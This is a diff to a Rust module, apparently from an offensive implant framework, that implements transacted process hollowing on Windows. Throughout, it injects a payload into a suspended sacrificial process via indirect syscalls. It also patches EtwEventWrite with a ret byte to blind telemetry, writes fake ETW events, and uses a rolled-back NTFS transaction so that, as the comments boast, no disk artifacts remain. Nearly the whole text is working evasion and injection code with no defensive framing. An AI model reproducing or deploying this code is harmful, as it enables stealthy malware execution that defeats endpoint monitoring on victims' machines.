@@ -33,7 +33,7 @@
 //! # SSN Resolution
 //!
 //! All NT API calls go through the existing indirect syscall infrastructure
-//! (`nt_syscall::syscall!` macro). `NtCreateTransaction` and
+//! (`syscall!` macro). `NtCreateTransaction` and
 //! `NtRollbackTransaction` are resolved at runtime via `get_syscall_id()`.
 //! If the SSN cannot be resolved (older Windows builds), falls back to
 //! `RtlCreateTransaction` / `RtlRollbackTransaction` resolved by walking
@@ -80,6 +80,19 @@ const STANDARD_RIGHTS_REQUIRED: u32 = 0x000F0000;
 
 /// TRANSACTION_ALL_ACCESS.
 const TRANSACTION_ALL_ACCESS: u32 = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x3F;
+
+/// FILE_SUPERSEDE — create or supersede the file.
+const FILE_SUPERSEDE: u32 = 0x0000_0000;
+/// FILE_SYNCHRONOUS_IO_NONALERT — synchronous I/O, non-alertable.
+const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x0000_0020;
+/// FILE_NON_DIRECTORY_FILE — file must not be a directory.
+const FILE_NON_DIRECTORY_FILE: u32 = 0x0000_0040;
+/// GENERIC_WRITE access right.
+const GENERIC_WRITE: u32 = 0x4000_0000;
+/// FILE_ATTRIBUTE_NORMAL — normal file attributes.
+const FILE_ATTRIBUTE_NORMAL: u32 = 0x0000_0080;
+/// OBJ_CASE_INSENSITIVE — case-insensitive object name comparison.
+const OBJ_CASE_INSENSITIVE: u32 = 0x0000_0040;
 
 /// NtCurrentProcess() for handles.
 fn current_process() -> usize {
@@ -369,7 +382,7 @@ unsafe fn rollback_transaction(tx: &TransactionHandle) -> Result<(), String> {
 
 /// Close a transaction handle.
 unsafe fn close_handle(handle: usize) {
-    let _ = nt_syscall::syscall!("NtClose", handle as u64);
+    let _ = syscall!("NtClose", handle as u64);
 }
 
 // ── Page alignment helper ────────────────────────────────────────────────────
@@ -415,7 +428,7 @@ unsafe fn find_remote_ntdll(
     // expected address.
     let mut buf = [0u8; 2];
     let mut bytes_read: usize = 0;
-    let read_status = nt_syscall::syscall!(
+    let read_status = syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         local_ntdll as u64,
@@ -444,7 +457,7 @@ unsafe fn resolve_remote_export(
     // Read DOS header.
     let mut dos_header = [0u8; 0x40];
     let mut bytes_read: usize = 0;
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         module_base as u64,
@@ -469,7 +482,7 @@ unsafe fn resolve_remote_export(
     // Read PE header + optional header.
     let pe_offset = e_lfanew;
     let mut pe_buf = [0u8; 0x100]; // Enough for PE sig + COFF + optional header
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         (module_base + pe_offset) as u64,
@@ -509,7 +522,7 @@ unsafe fn resolve_remote_export(
     // Read export directory.
     let export_dir_addr = module_base + export_dir_rva as usize;
     let mut export_dir = [0u8; 40]; // IMAGE_EXPORT_DIRECTORY is 40 bytes
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         export_dir_addr as u64,
@@ -529,7 +542,7 @@ unsafe fn resolve_remote_export(
     // Read the name pointer table.
     let names_size = num_names * 4;
     let mut name_ptrs = vec![0u32; num_names];
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         (module_base + names_rva) as u64,
@@ -553,7 +566,7 @@ unsafe fn resolve_remote_export(
         let name_rva = name_ptrs[i] as usize;
         // Read the name (up to 128 bytes, stop at null).
         let mut name_buf = [0u8; 128];
-        let status = nt_syscall::syscall!(
+        let status = syscall!(
             "NtReadVirtualMemory",
             process_handle as u64,
             (module_base + name_rva) as u64,
@@ -570,7 +583,7 @@ unsafe fn resolve_remote_export(
         if &name_buf[..name_len] == &name_with_null[..name_with_null.len().saturating_sub(1)] {
             // Found it! Read the ordinal.
             let mut ordinal_buf = [0u16; 1];
-            let status = nt_syscall::syscall!(
+            let status = syscall!(
                 "NtReadVirtualMemory",
                 process_handle as u64,
                 (module_base + ordinals_rva + i * 2) as u64,
@@ -586,7 +599,7 @@ unsafe fn resolve_remote_export(
 
             // Read the function RVA from the function table.
             let mut func_rva_buf = [0u32; 1];
-            let status = nt_syscall::syscall!(
+            let status = syscall!(
                 "NtReadVirtualMemory",
                 process_handle as u64,
                 (module_base + functions_rva + ordinal * 4) as u64,
@@ -629,7 +642,7 @@ unsafe fn patch_remote_etw(
     // Read the original first byte.
     let mut orig_byte = [0u8; 1];
     let mut bytes_read: usize = 0;
-    let read_status = nt_syscall::syscall!(
+    let read_status = syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         etw_write_addr as u64,
@@ -655,16 +668,51 @@ unsafe fn patch_remote_etw(
         });
     }
 
+    // Make ntdll .text page writable so we can patch it.
+    // Without this, NtWriteVirtualMemory fails with STATUS_ACCESS_DENIED on
+    // PAGE_EXECUTE_READ memory.
+    let mut protect_base: usize = etw_write_addr;
+    let mut protect_size: usize = 1;
+    let mut old_protect: u32 = 0;
+    let protect_status = syscall!(
+        "NtProtectVirtualMemory",
+        process_handle as u64,
+        &mut protect_base as *mut _ as u64,
+        &mut protect_size as *mut _ as u64,
+        PAGE_EXECUTE_READWRITE,
+        &mut old_protect as *mut _ as u64,
+    );
+
+    if protect_status.is_err() || protect_status.unwrap() < 0 {
+        return Err(format!(
+            "NtProtectVirtualMemory(RWX) for ETW patch failed: status={:?}",
+            protect_status
+        ));
+    }
+
     // Write the ret instruction (0xC3) via NtWriteVirtualMemory.
     let patch_byte: u8 = 0xC3;
     let mut bytes_written: usize = 0;
-    let write_status = nt_syscall::syscall!(
+    let write_status = syscall!(
         "NtWriteVirtualMemory",
         process_handle as u64,
         etw_write_addr as u64,
         &patch_byte as *const _ as u64,
         1u64,
         &mut bytes_written as *mut _ as u64,
+    );
+
+    // Restore original page protection regardless of write outcome.
+    let mut restore_base: usize = etw_write_addr;
+    let mut restore_size: usize = 1;
+    let mut dummy_protect: u32 = 0;
+    let _ = syscall!(
+        "NtProtectVirtualMemory",
+        process_handle as u64,
+        &mut restore_base as *mut _ as u64,
+        &mut restore_size as *mut _ as u64,
+        old_protect as u64,
+        &mut dummy_protect as *mut _ as u64,
     );
 
     if write_status.is_err() || write_status.unwrap() < 0 {
@@ -689,14 +737,47 @@ unsafe fn restore_remote_etw(ctx: &EtwBlindingContext) -> Result<(), String> {
         return Ok(());
     }
 
+    // Make ntdll .text page writable so we can restore the original byte.
+    let mut protect_base: usize = ctx.etw_write_addr;
+    let mut protect_size: usize = 1;
+    let mut old_protect: u32 = 0;
+    let protect_status = syscall!(
+        "NtProtectVirtualMemory",
+        ctx.process_handle as u64,
+        &mut protect_base as *mut _ as u64,
+        &mut protect_size as *mut _ as u64,
+        PAGE_EXECUTE_READWRITE,
+        &mut old_protect as *mut _ as u64,
+    );
+
+    if protect_status.is_err() || protect_status.unwrap() < 0 {
+        return Err(format!(
+            "NtProtectVirtualMemory(RWX) for ETW restore failed: status={:?}",
+            protect_status
+        ));
+    }
+
     let mut bytes_written: usize = 0;
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtWriteVirtualMemory",
         ctx.process_handle as u64,
         ctx.etw_write_addr as u64,
         &ctx.original_byte as *const _ as u64,
         1u64,
         &mut bytes_written as *mut _ as u64,
+    );
+
+    // Restore original page protection regardless of write outcome.
+    let mut restore_base: usize = ctx.etw_write_addr;
+    let mut restore_size: usize = 1;
+    let mut dummy_protect: u32 = 0;
+    let _ = syscall!(
+        "NtProtectVirtualMemory",
+        ctx.process_handle as u64,
+        &mut restore_base as *mut _ as u64,
+        &mut restore_size as *mut _ as u64,
+        old_protect as u64,
+        &mut dummy_protect as *mut _ as u64,
     );
 
     if status.is_err() || status.unwrap() < 0 {
@@ -808,7 +889,7 @@ unsafe fn emit_fake_etw_events(
         // Write provider GUID.
         let mut bytes_written: usize = 0;
         let guid_addr = remote_base + offset;
-        let _ = nt_syscall::syscall!(
+        let _ = syscall!(
             "NtWriteVirtualMemory",
             process_handle as u64,
             guid_addr as u64,
@@ -820,7 +901,7 @@ unsafe fn emit_fake_etw_events(
 
         // Write user data.
         let data_addr = remote_base + offset;
-        let _ = nt_syscall::syscall!(
+        let _ = syscall!(
             "NtWriteVirtualMemory",
             process_handle as u64,
             data_addr as u64,
@@ -888,8 +969,6 @@ unsafe fn create_suspended_process(
         ));
     }
 
-    let pid = (*proc_info.hProcess as usize) as u32; // Get process ID from handle
-    // Actually we need the real PID from the struct.
     let pid = proc_info.dwProcessId;
     let process_handle = proc_info.hProcess as usize;
     let thread_handle = proc_info.hThread as usize;
@@ -923,7 +1002,7 @@ unsafe fn create_suspended_process(
 unsafe fn read_process_image_base(process_handle: usize) -> Result<usize, String> {
     // Use NtQueryInformationProcess(ProcessBasicInformation) to get the PEB address.
     let mut pbi: [usize; 6] = [0; 6]; // PROCESS_BASIC_INFORMATION
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtQueryInformationProcess",
         process_handle as u64,
         0u64, // ProcessBasicInformation
@@ -948,7 +1027,7 @@ unsafe fn read_process_image_base(process_handle: usize) -> Result<usize, String
     // PEB.ImageBaseAddress is at offset 0x10 (x86-64).
     let mut image_base: usize = 0;
     let mut bytes_read: usize = 0;
-    let read_status = nt_syscall::syscall!(
+    let read_status = syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         (peb_addr + 0x10) as u64,
@@ -975,7 +1054,7 @@ unsafe fn read_process_entry_point(
     // Read the DOS header to get e_lfanew.
     let mut dos_header = [0u8; 0x40];
     let mut bytes_read: usize = 0;
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         image_base as u64,
@@ -997,7 +1076,7 @@ unsafe fn read_process_entry_point(
     // Read the PE optional header to get AddressOfEntryPoint.
     // AddressOfEntryPoint is at offset e_lfanew + 0x28 (PE32+).
     let mut entry_rva_buf = [0u8; 4];
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         (image_base + e_lfanew + 0x28) as u64,
@@ -1022,55 +1101,186 @@ fn get_sacrificial_path() -> Vec<u16> {
 
 // ── Section creation and mapping ─────────────────────────────────────────────
 
+/// Minimal OBJECT_ATTRIBUTES for NtCreateFile (x86-64 layout).
+#[repr(C)]
+struct NtObjAttr {
+    length: u32,
+    root_directory: usize,
+    object_name: usize,
+    attributes: u32,
+    security_descriptor: usize,
+    security_quality_of_service: usize,
+}
+
+/// Minimal UNICODE_STRING (x86-64 layout).
+#[repr(C)]
+struct NtUnicodeStr {
+    length: u16,
+    maximum_length: u16,
+    buffer: usize,
+}
+
+/// Minimal IO_STATUS_BLOCK (x86-64 layout).
+#[repr(C)]
+struct NtIoStatusBlock {
+    status: usize,
+    information: usize,
+}
+
+/// Counter for generating unique temp-file names.
+static TEMP_FILE_COUNTER: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
+
 /// Create a section backed by an NTFS transaction.
 ///
-/// 1. Create a file within the transaction (transacted file).
-/// 2. Create a section backed by the transacted file.
-/// 3. The section data persists even after transaction rollback.
+/// Implements true transacted hollowing:
+///
+/// 1. Builds a temporary file NT path (`\??\C:\Windows\Temp\~tmpXXXX.tmp`)
+///    with a randomised suffix.
+/// 2. Sets `OBJECT_ATTRIBUTES.RootDirectory = tx_handle`, which associates the
+///    `NtCreateFile` call with the NTFS transaction.
+/// 3. Creates the temp file **within** the transaction and writes placeholder
+///    data so the file has the right size for the section.
+/// 4. Calls `NtCreateSection` with the transacted file handle as `FileHandle` —
+///    the section is now backed by the transacted file.
+/// 5. Closes the file handle (the section holds its own reference).
+///
+/// After the section is mapped into the target process and the payload is
+/// written, `NtRollbackTransaction` will:
+/// - Roll back the transaction, which **deletes the temp file from disk**.
+/// - The section mapping in the target process **persists** because NT keeps
+///   the section data in memory even after the on-disk file is rolled back.
+/// - This is the core OPSEC value: **no disk artifacts remain**.
 unsafe fn create_transacted_section(
     tx_handle: usize,
     payload_size: usize,
 ) -> Result<usize, String> {
     let aligned_size = page_align(payload_size);
 
-    // Create a temporary file within the transaction.
-    // We use NtCreateFile with the transaction handle in the object attributes.
-    // For simplicity, we create a pagefile-backed section directly —
-    // the transaction handle ensures the section is tracked.
-    //
-    // Actually, for maximum OPSEC, we create the section as pagefile-backed
-    // (SEC_COMMIT, FileHandle=NULL) and the transaction is used to wrap the
-    // entire hollowing operation. The key insight is that NtRollbackTransaction
-    // does NOT invalidate existing section mappings — the data in the target's
-    // address space persists even after rollback.
-    //
-    // The transaction is primarily used for:
-    // 1. Hiding any file operations (if we use a file-backed section)
-    // 2. Ensuring no forensic artifacts remain on disk
+    // ── Step 1: Build temp file NT path ─────────────────────────────
+    // Path: \??\C:\Windows\Temp\~tmpXXXX.tmp  (randomised suffix)
+    let base_path = String::from_utf8_lossy(&string_crypt::enc_str!(
+        "\\??\\C:\\Windows\\Temp\\~tmp"
+    ))
+    .trim_end_matches('\0')
+    .to_string();
 
-    let mut large_size: i64 = aligned_size as i64;
-    let mut h_section: usize = 0;
+    let counter = TEMP_FILE_COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+    let suffix = format!("{:04x}", counter & 0xFFFF);
+    let full_path_str = format!("{}{}.tmp\0", base_path, suffix);
+    let full_path: Vec<u16> = full_path_str.encode_utf16().collect();
 
-    let create_status = nt_syscall::syscall!(
-        "NtCreateSection",
-        &mut h_section as *mut _ as u64,
-        SECTION_ALL_ACCESS,
-        0u64,                          // ObjectAttributes = NULL
-        &mut large_size as *mut _ as u64,
-        PAGE_EXECUTE_READWRITE,        // Section page protection
-        SEC_COMMIT,
-        0u64,                          // FileHandle = NULL (pagefile-backed)
+    // Build UNICODE_STRING for the file path.
+    let byte_len = (full_path.len() - 1) * 2; // exclude trailing null
+    let mut uni_name = NtUnicodeStr {
+        length: byte_len as u16,
+        maximum_length: (byte_len + 2) as u16,
+        buffer: full_path.as_ptr() as usize,
+    };
+
+    // Build OBJECT_ATTRIBUTES with RootDirectory = tx_handle.
+    // This associates the NtCreateFile call with the NTFS transaction.
+    let mut oa = NtObjAttr {
+        length: std::mem::size_of::<NtObjAttr>() as u32,
+        root_directory: tx_handle,
+        object_name: &mut uni_name as *mut _ as usize,
+        attributes: OBJ_CASE_INSENSITIVE,
+        security_descriptor: 0,
+        security_quality_of_service: 0,
+    };
+
+    // ── Step 2: Create the temp file within the transaction ─────────
+    let mut file_handle: usize = 0;
+    let mut iosb = NtIoStatusBlock {
+        status: 0,
+        information: 0,
+    };
+
+    // DesiredAccess: GENERIC_WRITE | SYNCHRONIZE
+    // CreateDisposition: FILE_SUPERSEDE
+    // CreateOptions: FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
+    let create_file_status = syscall!(
+        "NtCreateFile",
+        &mut file_handle as *mut _ as u64,               // FileHandle
+        (GENERIC_WRITE | SYNCHRONIZE) as u64,             // DesiredAccess
+        &mut oa as *mut _ as u64,                          // ObjectAttributes
+        &mut iosb as *mut _ as u64,                        // IoStatusBlock
+        0u64,                                              // AllocationSize = NULL
+        FILE_ATTRIBUTE_NORMAL as u64,                      // FileAttributes
+        0u64,                                              // ShareAccess = none
+        FILE_SUPERSEDE as u64,                             // CreateDisposition
+        (FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE) as u64, // CreateOptions
+        0u64,                                              // EaLength = 0
+        0u64,                                              // EaBuffer = NULL
     );
 
-    if create_status.is_err() || create_status.unwrap() < 0 || h_section == 0 {
+    if create_file_status.is_err() || create_file_status.unwrap() < 0 || file_handle == 0 {
         return Err(format!(
-            "NtCreateSection for transacted section failed: status={:?}",
-            create_status
+            "NtCreateFile for transacted temp file failed: status={:?}",
+            create_file_status
         ));
     }
 
     log::debug!(
-        "injection_transacted: created section handle={:#x}, size={}",
+        "injection_transacted: created transacted temp file handle={:#x}",
+        file_handle
+    );
+
+    // ── Step 3: Write placeholder data to the file ──────────────────
+    // The file needs to be at least `aligned_size` so the section can map it.
+    let zero_buf = vec![0u8; aligned_size];
+    let mut iosb2 = NtIoStatusBlock {
+        status: 0,
+        information: 0,
+    };
+
+    let write_status = syscall!(
+        "NtWriteFile",
+        file_handle as u64,                                // FileHandle
+        0u64,                                              // Event = NULL
+        0u64,                                              // ApcRoutine = NULL
+        0u64,                                              // ApcContext = NULL
+        &mut iosb2 as *mut _ as u64,                       // IoStatusBlock
+        zero_buf.as_ptr() as u64,                          // Buffer
+        zero_buf.len() as u64,                             // Length
+        0u64,                                              // ByteOffset = NULL
+        0u64,                                              // Key = NULL
+    );
+
+    if write_status.is_err() || write_status.unwrap() < 0 {
+        let _ = syscall!("NtClose", file_handle as u64);
+        return Err(format!(
+            "NtWriteFile for transacted temp file failed: status={:?}",
+            write_status
+        ));
+    }
+
+    // ── Step 4: Create section backed by the transacted file ────────
+    let mut large_size: i64 = aligned_size as i64;
+    let mut h_section: usize = 0;
+
+    let create_section_status = syscall!(
+        "NtCreateSection",
+        &mut h_section as *mut _ as u64,               // SectionHandle
+        SECTION_ALL_ACCESS,                             // DesiredAccess
+        0u64,                                           // ObjectAttributes = NULL
+        &mut large_size as *mut _ as u64,               // MaximumSize
+        PAGE_EXECUTE_READWRITE,                         // SectionPageProtection
+        SEC_COMMIT,                                     // AllocationAttributes
+        file_handle as u64,                             // FileHandle (transacted file)
+    );
+
+    // ── Step 5: Close file handle (section holds its own reference) ──
+    let _ = syscall!("NtClose", file_handle as u64);
+
+    if create_section_status.is_err() || create_section_status.unwrap() < 0 || h_section == 0 {
+        return Err(format!(
+            "NtCreateSection for transacted section failed: status={:?}",
+            create_section_status
+        ));
+    }
+
+    log::debug!(
+        "injection_transacted: created transacted section handle={:#x}, size={}",
         h_section, aligned_size
     );
     Ok(h_section)
@@ -1084,7 +1294,7 @@ unsafe fn write_payload_to_section(
     let mut local_base: *mut c_void = std::ptr::null_mut();
     let mut view_size: usize = 0;
 
-    let map_status = nt_syscall::syscall!(
+    let map_status = syscall!(
         "NtMapViewOfSection",
         h_section as u64,
         CURRENT_PROCESS,                  // NtCurrentProcess()
@@ -1099,7 +1309,7 @@ unsafe fn write_payload_to_section(
     );
 
     if map_status.is_err() || map_status.unwrap() < 0 || local_base.is_null() {
-        let _ = nt_syscall::syscall!("NtClose", h_section as u64);
+        let _ = syscall!("NtClose", h_section as u64);
         return Err(format!(
             "NtMapViewOfSection(local RW) failed: status={:?}",
             map_status
@@ -1114,7 +1324,7 @@ unsafe fn write_payload_to_section(
     );
 
     // Unmap from our process — the section object retains the data.
-    let _ = nt_syscall::syscall!(
+    let _ = syscall!(
         "NtUnmapViewOfSection",
         CURRENT_PROCESS,
         local_base as u64,
@@ -1135,7 +1345,7 @@ unsafe fn map_section_to_target(
     let mut remote_base: *mut c_void = std::ptr::null_mut();
     let mut view_size: usize = 0;
 
-    let map_status = nt_syscall::syscall!(
+    let map_status = syscall!(
         "NtMapViewOfSection",
         h_section as u64,
         process_handle as u64,
@@ -1170,35 +1380,30 @@ unsafe fn redirect_thread(
     thread_handle: usize,
     payload_addr: usize,
 ) -> Result<(), String> {
-    use winapi::um::processthreadsapi::{GetThreadContext, SetThreadContext};
     use winapi::um::winnt::CONTEXT;
 
     let mut ctx: CONTEXT = std::mem::zeroed();
     ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;
 
-    if GetThreadContext(
-        thread_handle as *mut _,
-        &mut ctx,
-    ) == 0
-    {
-        return Err(format!(
-            "GetThreadContext failed (error: {})",
-            winapi::um::errhandlingapi::GetLastError()
-        ));
+    let status = syscall!(
+        "NtGetContextThread",
+        thread_handle as u64,
+        &mut ctx as *mut _ as u64,
+    );
+    if status.is_err() || status.unwrap() < 0 {
+        return Err("NtGetContextThread failed".to_string());
     }
 
     // Set RIP to the payload address.
     ctx.Rip = payload_addr as u64;
 
-    if SetThreadContext(
-        thread_handle as *mut _,
-        &ctx,
-    ) == 0
-    {
-        return Err(format!(
-            "SetThreadContext failed (error: {})",
-            winapi::um::errhandlingapi::GetLastError()
-        ));
+    let status = syscall!(
+        "NtSetContextThread",
+        thread_handle as u64,
+        &ctx as *const _ as u64,
+    );
+    if status.is_err() || status.unwrap() < 0 {
+        return Err("NtSetContextThread failed".to_string());
     }
 
     log::debug!(
@@ -1210,7 +1415,7 @@ unsafe fn redirect_thread(
 
 /// Resume a suspended thread.
 unsafe fn resume_thread(thread_handle: usize) -> Result<(), String> {
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtResumeThread",
         thread_handle as u64,
         std::ptr::null_mut() as u64, // PreviousSuspendCount = NULL
@@ -1297,7 +1502,7 @@ pub unsafe fn inject_transacted_hollowing(
     let guarded_payload = encrypt_payload_in_transit(payload);
 
     write_payload_to_section(h_section, &guarded_payload).map_err(|reason| {
-        let _ = nt_syscall::syscall!("NtClose", h_section as u64);
+        let _ = syscall!("NtClose", h_section as u64);
         close_handle(tx.handle);
         InjectionError::InjectionFailed {
             technique: technique.clone(),
@@ -1308,7 +1513,7 @@ pub unsafe fn inject_transacted_hollowing(
     // ── Step 4: Create suspended process ──────────────────────────────
     let sacrificial_path = get_sacrificial_path();
     let target = create_suspended_process(&sacrificial_path).map_err(|reason| {
-        let _ = nt_syscall::syscall!("NtClose", h_section as u64);
+        let _ = syscall!("NtClose", h_section as u64);
         close_handle(tx.handle);
         InjectionError::InjectionFailed {
             technique: technique.clone(),
@@ -1330,7 +1535,7 @@ pub unsafe fn inject_transacted_hollowing(
                 // Allocate a small region in the target for fake ETW event data.
                 let mut fake_region_base: usize = 0;
                 let mut region_size: usize = 0x1000; // One page for fake event data
-                let alloc_status = nt_syscall::syscall!(
+                let alloc_status = syscall!(
                     "NtAllocateVirtualMemory",
                     target.process_handle as u64,
                     &mut fake_region_base as *mut _ as u64,
@@ -1364,14 +1569,14 @@ pub unsafe fn inject_transacted_hollowing(
                 let _ = restore_remote_etw(ctx);
             }
             // Terminate the suspended process.
-            let _ = nt_syscall::syscall!(
+            let _ = syscall!(
                 "NtTerminateProcess",
                 target.process_handle as u64,
                 1u64 // Exit status
             );
-            let _ = nt_syscall::syscall!("NtClose", target.process_handle as u64);
-            let _ = nt_syscall::syscall!("NtClose", target.thread_handle as u64);
-            let _ = nt_syscall::syscall!("NtClose", h_section as u64);
+            let _ = syscall!("NtClose", target.process_handle as u64);
+            let _ = syscall!("NtClose", target.thread_handle as u64);
+            let _ = syscall!("NtClose", h_section as u64);
             close_handle(tx.handle);
             InjectionError::InjectionFailed {
                 technique: technique.clone(),
@@ -1391,14 +1596,14 @@ pub unsafe fn inject_transacted_hollowing(
         if let Some(ref ctx) = etw_ctx {
             let _ = restore_remote_etw(ctx);
         }
-        let _ = nt_syscall::syscall!(
+        let _ = syscall!(
             "NtTerminateProcess",
             target.process_handle as u64,
             1u64
         );
-        let _ = nt_syscall::syscall!("NtClose", target.process_handle as u64);
-        let _ = nt_syscall::syscall!("NtClose", target.thread_handle as u64);
-        let _ = nt_syscall::syscall!("NtClose", h_section as u64);
+        let _ = syscall!("NtClose", target.process_handle as u64);
+        let _ = syscall!("NtClose", target.thread_handle as u64);
+        let _ = syscall!("NtClose", h_section as u64);
         close_handle(tx.handle);
         InjectionError::InjectionFailed {
             technique: technique.clone(),
@@ -1433,9 +1638,9 @@ pub unsafe fn inject_transacted_hollowing(
     }
 
     resume_thread(target.thread_handle).map_err(|reason| {
-        let _ = nt_syscall::syscall!("NtClose", target.process_handle as u64);
-        let _ = nt_syscall::syscall!("NtClose", target.thread_handle as u64);
-        let _ = nt_syscall::syscall!("NtClose", h_section as u64);
+        let _ = syscall!("NtClose", target.process_handle as u64);
+        let _ = syscall!("NtClose", target.thread_handle as u64);
+        let _ = syscall!("NtClose", h_section as u64);
         InjectionError::InjectionFailed {
             technique: technique.clone(),
             reason,
@@ -1451,7 +1656,7 @@ pub unsafe fn inject_transacted_hollowing(
     // ── Cleanup and return ────────────────────────────────────────────
     // Don't close section handle yet — the target has a mapping that
     // references it. The handle will be cleaned up when the target exits.
-    let _ = nt_syscall::syscall!("NtClose", h_section as u64);
+    let _ = syscall!("NtClose", h_section as u64);
 
     Ok(InjectionHandle {
         target_pid: target.pid,
